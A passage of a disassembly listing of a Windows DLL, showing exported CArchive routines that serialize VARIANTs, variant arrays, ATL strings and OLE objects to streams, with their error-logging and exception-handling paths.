		jnz	short loc_6AF3A2DD
		push	offset aCarchiveRea_23 ; "CArchive::Read(LPVARIANT) : ReadVariant"...

loc_6AF3A2C8:				; CODE XREF: Ordinal342+3Ej
					; Ordinal342+4Bj ...
		call	sub_6AF3102E
		mov	eax, [esi]
		pop	ecx
		push	dword ptr [esi+0Ch]
		mov	ecx, esi
		push	dword ptr [esi+8]
		call	dword ptr [eax+0Ch]
		jmp	short loc_6AF3A2ED
; ---------------------------------------------------------------------------

loc_6AF3A2DD:				; CODE XREF: Ordinal342+7Dj
		mov	eax, [ebp+var_8]
		xor	edi, edi
		add	eax, 5
		inc	edi
		add	[esi+8], eax
		adc	dword ptr [esi+0Ch], 0

loc_6AF3A2ED:				; CODE XREF: Ordinal342+97j
		mov	eax, edi
		pop	edi

loc_6AF3A2F0:				; CODE XREF: Ordinal342+1Cj
		pop	esi
		leave
		retn	4
Ordinal342	endp

; Exported entry 362.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal362
Ordinal362	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal342
		test	eax, eax
		jnz	short loc_6AF3A31C
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3A31C:				; CODE XREF: Ordinal362+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal362	endp

; Exported entry 371.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal371
Ordinal371	proc near		; CODE XREF: Ordinal371+A1p
					; Ordinal372+Bp
					; DATA XREF: ...

var_20		= byte ptr -20h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	ax, [edi]
		test	ah, 40h
		mov	ebx, ecx
		jnz	loc_6AF3A42B
		test	ah, 20h
		mov	ecx, eax
		jz	loc_6AF3A3E9
		and	ecx, 0Ch
		cmp	cx, 0Ch
		jz	short loc_6AF3A35B
		and	al, 11h
		cmp	al, 11h
		jnz	loc_6AF3A42B

loc_6AF3A35B:				; CODE XREF: Ordinal371+2Cj
		mov	eax, [edi+8]
		cmp	word ptr [eax],	1
		jnz	loc_6AF3A42B
		xor	esi, esi
		cmp	[eax+14h], esi
		jnz	loc_6AF3A42B
		cmp	cx, 0Ch
		jnz	loc_6AF3A435
		lea	ecx, [ebp+var_20]
		call	Ordinal1467
		push	edi
		lea	ecx, [ebp+var_20]
		call	Ordinal1482
		test	eax, eax
		jz	short loc_6AF3A3DD
		lea	ecx, [ebp+var_20]
		call	Ordinal1493
		test	eax, eax
		jz	short loc_6AF3A3DD
		lea	ecx, [ebp+var_20]
		call	Ordinal1488
		test	eax, eax
		lea	ecx, [ebp+var_20]
		jz	short loc_6AF3A3E0
		call	Ordinal1494
		mov	edi, eax
		test	edi, edi
		jle	short loc_6AF3A3D2

loc_6AF3A3B8:				; CODE XREF: Ordinal371+ADj
		push	esi		; rgIndices
		lea	ecx, [ebp+var_20]
		call	Ordinal1487
		push	eax
		mov	ecx, ebx
		call	Ordinal371
		test	eax, eax
		jz	short loc_6AF3A3D2
		inc	esi
		cmp	esi, edi
		jl	short loc_6AF3A3B8

loc_6AF3A3D2:				; CODE XREF: Ordinal371+93j
					; Ordinal371+A8j
		lea	ecx, [ebp+var_20]
		call	Ordinal1489
		xor	esi, esi
		inc	esi

loc_6AF3A3DD:				; CODE XREF: Ordinal371+6Dj
					; Ordinal371+79j
		lea	ecx, [ebp+var_20]

loc_6AF3A3E0:				; CODE XREF: Ordinal371+88j
		call	Ordinal1470
		mov	eax, esi
		jmp	short loc_6AF3A438
; ---------------------------------------------------------------------------

loc_6AF3A3E9:				; CODE XREF: Ordinal371+1Fj
		and	ecx, 0Dh
		cmp	cx, 0Dh
		mov	dl, 9
		jz	short loc_6AF3A3FC
		mov	bl, al
		and	bl, dl
		cmp	bl, dl
		jnz	short loc_6AF3A435

loc_6AF3A3FC:				; CODE XREF: Ordinal371+CFj
		and	[ebp+arg_0], 0
		cmp	cx, 0Dh
		jnz	short loc_6AF3A413
		push	dword ptr [edi+8]
		lea	ecx, [ebp+arg_0]
		call	sub_6AF3A221
		jmp	short loc_6AF3A424
; ---------------------------------------------------------------------------

loc_6AF3A413:				; CODE XREF: Ordinal371+E1j
		and	al, dl
		cmp	al, dl
		jnz	short loc_6AF3A42B
		push	dword ptr [edi+8]
		lea	ecx, [ebp+arg_0]
		call	sub_6AF3A221

loc_6AF3A424:				; CODE XREF: Ordinal371+EEj
		mov	eax, [ebp+arg_0]
		test	eax, eax
		jnz	short loc_6AF3A42F

loc_6AF3A42B:				; CODE XREF: Ordinal371+14j
					; Ordinal371+32j ...
		xor	eax, eax
		jmp	short loc_6AF3A438
; ---------------------------------------------------------------------------

loc_6AF3A42F:				; CODE XREF: Ordinal371+106j
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF3A435:				; CODE XREF: Ordinal371+54j
					; Ordinal371+D7j
		xor	eax, eax
		inc	eax

loc_6AF3A438:				; CODE XREF: Ordinal371+C4j
					; Ordinal371+10Aj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal371	endp

; Exported entry 380.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal380
Ordinal380	proc near		; CODE XREF: Ordinal372+EAp
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
pPStm		= dword	ptr -8
hMem		= dword	ptr -4
pstm		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		mov	eax, [ebp+pstm]
		push	ebx
		push	edi
		mov	edi, ecx
		mov	cx, [eax]
		xor	ebx, ebx
		cmp	cx, 9
		mov	[ebp+pPStm], ebx
		jnz	short loc_6AF3A467
		push	dword ptr [eax+8]
		lea	ecx, [ebp+pPStm]
		call	sub_6AF3A221
		jmp	short loc_6AF3A478
; ---------------------------------------------------------------------------

loc_6AF3A467:				; CODE XREF: Ordinal380+19j
		cmp	cx, 0Dh
		jnz	short loc_6AF3A47D
		push	dword ptr [eax+8]
		lea	ecx, [ebp+pPStm]
		call	sub_6AF3A221

loc_6AF3A478:				; CODE XREF: Ordinal380+26j
		cmp	[ebp+pPStm], ebx
		jnz	short loc_6AF3A48F

loc_6AF3A47D:				; CODE XREF: Ordinal380+2Cj
		push	offset aCarchiveWrit_3 ; "CArchive::WriteVariantObject() : piPers"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3A5D1
; ---------------------------------------------------------------------------

loc_6AF3A48F:				; CODE XREF: Ordinal380+3Cj
		push	esi		; Args
		lea	ecx, [ebp+pstm]
		mov	[ebp+pstm], ebx
		call	sub_6AF399D7
		push	eax		; ppstm
		push	1		; fDeleteOnRelease
		push	ebx		; hGlobal
		call	ds:CreateStreamOnHGlobal
		mov	esi, eax
		cmp	esi, ebx
		jl	loc_6AF3A5AB
		cmp	[ebp+pstm], ebx
		jz	loc_6AF3A5AB
		push	[ebp+pstm]	; pStm
		push	[ebp+pPStm]	; pPStm
		call	ds:OleSaveToStream
		cmp	eax, ebx
		jge	short loc_6AF3A4E9
		push	eax		; Args
		push	offset aCarchiveWrit_4 ; "CArchive::WriteVariantObject() : OleSav"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3A4D4:				; CODE XREF: Ordinal380+167j
		mov	eax, [ebp+pstm]
		cmp	eax, ebx
		pop	ecx
		jz	short loc_6AF3A4E2
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF3A4E2:				; CODE XREF: Ordinal380+9Bj
		xor	esi, esi
		jmp	loc_6AF3A5C5
; ---------------------------------------------------------------------------

loc_6AF3A4E9:				; CODE XREF: Ordinal380+87j
		lea	eax, [ebp+hMem]
		push	eax		; phglobal
		push	[ebp+pstm]	; pstm
		mov	[ebp+hMem], ebx
		call	ds:GetHGlobalFromStream
		test	eax, eax
		jl	loc_6AF3A59C
		cmp	[ebp+hMem], ebx
		jz	loc_6AF3A59C
		push	[ebp+hMem]	; hMem
		call	ds:GlobalLock
		mov	ebx, eax
		xor	esi, esi
		cmp	ebx, esi
		jnz	short loc_6AF3A52F
		push	offset aCarchiveWrit_5 ; "CArchive::WriteVariantObject() : Global"...
		call	sub_6AF3102E
		mov	eax, [ebp+pstm]
		cmp	eax, esi
		jmp	loc_6AF3A5BC
; ---------------------------------------------------------------------------

loc_6AF3A52F:				; CODE XREF: Ordinal380+DAj
		push	[ebp+hMem]	; hMem
		mov	[ebp+var_10], esi
		call	ds:GlobalSize
		push	4
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], eax
		mov	eax, [edi]
		push	ecx
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jz	short loc_6AF3A564
		push	[ebp+var_C]
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		mov	eax, [edi]
		push	ebx
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3A571

loc_6AF3A564:				; CODE XREF: Ordinal380+10Ej
		push	offset aCarchiveWrit_6 ; "CArchive::WriteVariantObject() : WriteE"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3A57D
; ---------------------------------------------------------------------------

loc_6AF3A571:				; CODE XREF: Ordinal380+123j
		mov	eax, [ebp+var_C]
		add	[esi], eax
		mov	[ebp+var_10], 1

loc_6AF3A57D:				; CODE XREF: Ordinal380+130j
		push	[ebp+hMem]	; hMem
		call	ds:GlobalUnlock
		mov	eax, [ebp+pstm]
		and	[ebp+hMem], 0
		test	eax, eax
		jz	short loc_6AF3A597
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF3A597:				; CODE XREF: Ordinal380+150j
		mov	esi, [ebp+var_10]
		jmp	short loc_6AF3A5C5
; ---------------------------------------------------------------------------

loc_6AF3A59C:				; CODE XREF: Ordinal380+BCj
					; Ordinal380+C5j
		push	offset aCarchiveWrit_7 ; "CArchive::WriteVariantObject() : GetHGl"...
		call	sub_6AF3102E
		jmp	loc_6AF3A4D4
; ---------------------------------------------------------------------------

loc_6AF3A5AB:				; CODE XREF: Ordinal380+6Aj
					; Ordinal380+73j
		push	esi		; Args
		push	offset aCarchiveWrit_8 ; "CArchive::WriteVariantObject() : Create"...
		call	sub_6AF3102E
		mov	eax, [ebp+pstm]
		pop	ecx
		cmp	eax, ebx

loc_6AF3A5BC:				; CODE XREF: Ordinal380+EBj
		pop	ecx
		jz	short loc_6AF3A5C5
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF3A5C5:				; CODE XREF: Ordinal380+A5j
					; Ordinal380+15Bj ...
		mov	eax, [ebp+pPStm]
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]
		mov	eax, esi
		pop	esi

loc_6AF3A5D1:				; CODE XREF: Ordinal380+4Bj
		pop	edi
		pop	ebx
		leave
		retn	8
Ordinal380	endp

; Exported entry 340.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal340
Ordinal340	proc near		; CODE XREF: Ordinal299+C3p
					; Ordinal360+9p ...

var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_51 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF317A8
		lea	eax, [ebp+var_2C]
		xor	edi, edi
		push	eax
		mov	ecx, esi
		mov	[ebp+var_2C], edi
		call	Ordinal314
		test	eax, eax
		jnz	short loc_6AF3A622
		push	offset aCarchiveReadAt ; "CArchive::Read(::ATL::CAtlStringA&) :	P"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3A72F
; ---------------------------------------------------------------------------

loc_6AF3A622:				; CODE XREF: Ordinal340+37j
		push	offset aCarchiveRea_24 ; "CArchive::Read(::ATL::CAtlStringA&)"
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_28], 1
		call	Ordinal751
		push	[ebp+var_2C]
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_4], edi
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31911
		push	[ebp+var_2C]
		mov	ecx, esi
		push	eax
		call	Ordinal334
		test	eax, eax
		jnz	loc_6AF3A708
		push	offset aCarchiveRea_25 ; "CArchive::Read(::ATL::CAtlStringA&) :	R"...
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_28], edi
		jmp	loc_6AF3A708
; ---------------------------------------------------------------------------

loc_6AF3A66E:				; DATA XREF: .rdata:6AF6293Co
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3A706
		retn
; ---------------------------------------------------------------------------

loc_6AF3A6B1:				; DATA XREF: .rdata:6AF6294Co
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3A706
		retn
; ---------------------------------------------------------------------------

loc_6AF3A706:				; DATA XREF: Ordinal340+D4o
					; Ordinal340+129o
		xor	edi, edi

loc_6AF3A708:				; CODE XREF: Ordinal340+7Ej
					; Ordinal340+92j
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_4], edi
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF3A71A
		mov	[ebp+var_28], edi

loc_6AF3A71A:				; CODE XREF: Ordinal340+13Ej
		mov	ecx, [ebp+arg_0]
		push	0FFFFFFFFh
		call	sub_6AF3531D
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		mov	eax, [ebp+var_28]

loc_6AF3A72F:				; CODE XREF: Ordinal340+46j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal340	endp ; sp-analysis failed

; Exported entry 341.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal341
Ordinal341	proc near		; CODE XREF: Ordinal299+D3p
					; Ordinal361+9p ...

var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_52 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF33810
		lea	eax, [ebp+var_2C]
		xor	edi, edi
		push	eax
		mov	ecx, esi
		mov	[ebp+var_2C], edi
		call	Ordinal314
		test	eax, eax
		jnz	short loc_6AF3A793
		push	offset aCarchiveRea_26 ; "CArchive::Read(::ATL::CAtlStringW&) :	P"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3A8A3
; ---------------------------------------------------------------------------

loc_6AF3A793:				; CODE XREF: Ordinal341+37j
		push	offset aCarchiveRea_27 ; "CArchive::Read(::ATL::CAtlStringW&)"
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_28], 1
		call	Ordinal751
		mov	eax, [ebp+var_2C]
		mov	ecx, [ebp+arg_0]
		shr	eax, 1
		mov	[ebp+var_4], edi
		push	eax
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF33BA4
		push	[ebp+var_2C]
		mov	ecx, esi
		push	eax
		call	Ordinal337
		test	eax, eax
		jnz	loc_6AF3A87C
		push	offset aCarchiveRea_28 ; "CArchive::Read(::ATL::CAtlStringW&) :	R"...
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_28], edi
		jmp	loc_6AF3A87C
; ---------------------------------------------------------------------------

loc_6AF3A7E2:				; DATA XREF: .rdata:6AF629A4o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3A87A
		retn
; ---------------------------------------------------------------------------

loc_6AF3A825:				; DATA XREF: .rdata:6AF629B4o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3A87A
		retn
; ---------------------------------------------------------------------------

loc_6AF3A87A:				; DATA XREF: Ordinal341+D7o
					; Ordinal341+12Co
		xor	edi, edi

loc_6AF3A87C:				; CODE XREF: Ordinal341+81j
					; Ordinal341+95j
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_4], edi
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF3A88E
		mov	[ebp+var_28], edi

loc_6AF3A88E:				; CODE XREF: Ordinal341+141j
		mov	ecx, [ebp+arg_0]
		push	0FFFFFFFFh
		call	sub_6AF376DF
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		mov	eax, [ebp+var_28]

loc_6AF3A8A3:				; CODE XREF: Ordinal341+46j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal341	endp ; sp-analysis failed

; Exported entry 360.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal360
Ordinal360	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal340
		test	eax, eax
		jnz	short loc_6AF3A8E3
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3A8E3:				; CODE XREF: Ordinal360+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal360	endp

; Exported entry 361.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal361
Ordinal361	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal341
		test	eax, eax
		jnz	short loc_6AF3A911
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3A911:				; CODE XREF: Ordinal361+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal361	endp

; Exported entry 372.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal372
Ordinal372	proc near		; CODE XREF: Ordinal374+91p
					; Ordinal343+6Fp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	edi
		push	ebx
		mov	edi, ecx
		call	Ordinal371
		test	eax, eax
		jnz	short loc_6AF3A93E
		push	offset aCarchiveWrit_9 ; "CArchive::WriteVariant() : IsVariantSup"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3A9F8
; ---------------------------------------------------------------------------

loc_6AF3A93E:				; CODE XREF: Ordinal372+12j
		mov	eax, [edi]
		and	[ebp+arg_0], 0
		push	2
		push	ebx
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3A960
		push	offset aCarchiveWri_10 ; "CArchive::WriteVariant() : WriteEx() =="...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF3A9F5
; ---------------------------------------------------------------------------

loc_6AF3A960:				; CODE XREF: Ordinal372+36j
		push	esi		; Args
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 2
		mov	ax, [ebx]
		test	ah, 20h
		mov	cl, al
		jz	short loc_6AF3A9AD
		and	cl, 11h
		cmp	cl, 11h
		jnz	short loc_6AF3A993
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal376
		test	eax, eax
		jnz	short loc_6AF3A9ED
		push	offset aCarchiveWri_11 ; "CArchive::WriteVariant() : WriteVariant"...

loc_6AF3A98B:				; CODE XREF: Ordinal372+93j
					; Ordinal372+BDj ...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3A9F4
; ---------------------------------------------------------------------------

loc_6AF3A993:				; CODE XREF: Ordinal372+5Fj
		and	al, 0Ch
		cmp	al, 0Ch
		jnz	short loc_6AF3A9ED
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal374
		test	eax, eax
		jnz	short loc_6AF3A9ED
		push	offset aCarchiveWri_12 ; "CArchive::WriteVariant() : WriteVariant"...
		jmp	short loc_6AF3A98B
; ---------------------------------------------------------------------------

loc_6AF3A9AD:				; CODE XREF: Ordinal372+57j
		and	cl, 9
		cmp	cl, 9
		jz	short loc_6AF3A9FE
		mov	cl, al
		and	cl, 0Dh
		cmp	cl, 0Dh
		jz	short loc_6AF3A9FE
		test	al, 8
		mov	ecx, edi
		jz	short loc_6AF3A9D7
		push	esi
		push	ebx
		call	Ordinal378
		test	eax, eax
		jnz	short loc_6AF3A9ED
		push	offset aCarchiveWri_13 ; "CArchive::WriteVariant() : WriteVariant"...
		jmp	short loc_6AF3A98B
; ---------------------------------------------------------------------------

loc_6AF3A9D7:				; CODE XREF: Ordinal372+ABj
		mov	eax, [edi]
		push	10h
		push	ebx
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3A9EA
		push	offset aCarchiveWri_10 ; "CArchive::WriteVariant() : WriteEx() =="...
		jmp	short loc_6AF3A98B
; ---------------------------------------------------------------------------

loc_6AF3A9EA:				; CODE XREF: Ordinal372+C9j
		add	dword ptr [esi], 10h

loc_6AF3A9ED:				; CODE XREF: Ordinal372+6Cj
					; Ordinal372+7Fj ...
		mov	[ebp+arg_0], 1

loc_6AF3A9F4:				; CODE XREF: Ordinal372+79j
		pop	esi

loc_6AF3A9F5:				; CODE XREF: Ordinal372+43j
		mov	eax, [ebp+arg_0]

loc_6AF3A9F8:				; CODE XREF: Ordinal372+21j
		pop	edi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_6AF3A9FE:				; CODE XREF: Ordinal372+9Bj
					; Ordinal372+A5j
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal380
		test	eax, eax
		jnz	short loc_6AF3A9ED
		push	offset aCarchiveWri_14 ; "CArchive::WriteVariant() : WriteVariant"...
		jmp	loc_6AF3A98B
Ordinal372	endp

; Exported entry 374.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal374
Ordinal374	proc near		; CODE XREF: Ordinal372+85p
					; DATA XREF: .rdata:off_6AF66098o

var_28		= byte ptr -28h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		xor	edi, edi
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_8], edi
		call	Ordinal1467
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_28]
		call	Ordinal1482
		test	eax, eax
		jz	loc_6AF3AAD0
		lea	ecx, [ebp+var_28]
		call	Ordinal1493
		test	eax, eax
		jz	loc_6AF3AAD0
		lea	ecx, [ebp+var_28]
		call	Ordinal1494
		push	4
		lea	ecx, [ebp+var_4]
		mov	[ebp+var_4], eax
		mov	eax, [ebx]
		push	ecx
		mov	ecx, ebx
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3AA73
		push	offset aCarchiveWri_15 ; "CArchive::WriteVariantArray()	: WriteEx"...
		jmp	short loc_6AF3AAD5
; ---------------------------------------------------------------------------

loc_6AF3AA73:				; CODE XREF: Ordinal374+55j
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		lea	ecx, [ebp+var_28]
		call	Ordinal1488
		test	eax, eax
		jnz	short loc_6AF3AA8C
		push	offset aCarchiveWri_16 ; "CArchive::WriteVariantArray()	: varArra"...
		jmp	short loc_6AF3AAD5
; ---------------------------------------------------------------------------

loc_6AF3AA8C:				; CODE XREF: Ordinal374+6Ej
		cmp	[ebp+var_4], 0
		mov	[ebp+var_8], 1
		jbe	short loc_6AF3AAC6

loc_6AF3AA99:				; CODE XREF: Ordinal374+9Ej
		push	edi		; rgIndices
		lea	ecx, [ebp+var_28]
		call	Ordinal1487
		push	esi
		push	eax
		mov	ecx, ebx
		call	Ordinal372
		test	eax, eax
		jz	short loc_6AF3AAB7
		inc	edi
		cmp	edi, [ebp+var_4]
		jb	short loc_6AF3AA99
		jmp	short loc_6AF3AAC6
; ---------------------------------------------------------------------------

loc_6AF3AAB7:				; CODE XREF: Ordinal374+98j
		push	offset aCarchiveWri_17 ; "CArchive::WriteVariantArray()	: WriteVa"...
		call	sub_6AF3102E
		and	[ebp+var_8], 0
		pop	ecx

loc_6AF3AAC6:				; CODE XREF: Ordinal374+82j
					; Ordinal374+A0j
		lea	ecx, [ebp+var_28]
		call	Ordinal1489
		jmp	short loc_6AF3AADB
; ---------------------------------------------------------------------------

loc_6AF3AAD0:				; CODE XREF: Ordinal374+25j
					; Ordinal374+35j
		push	offset aCarchiveWri_18 ; "CArchive::WriteVariantArray()	: varArra"...

loc_6AF3AAD5:				; CODE XREF: Ordinal374+5Cj
					; Ordinal374+75j
		call	sub_6AF3102E
		pop	ecx

loc_6AF3AADB:				; CODE XREF: Ordinal374+B9j
		lea	ecx, [ebp+var_28]
		call	Ordinal1470
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal374	endp

; Exported entry 343.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal343
Ordinal343	proc near		; CODE XREF: Ordinal300+115p
					; Ordinal363+9p ...

var_28		= byte ptr -28h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 2
		jz	short loc_6AF3AB0E
		push	offset aCarchiveWriteL ; "CArchive::Write(LPCVARIANT) :	m_eArchiv"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3ABD0
; ---------------------------------------------------------------------------

loc_6AF3AB0E:				; CODE XREF: Ordinal343+Dj
		mov	eax, [esi]
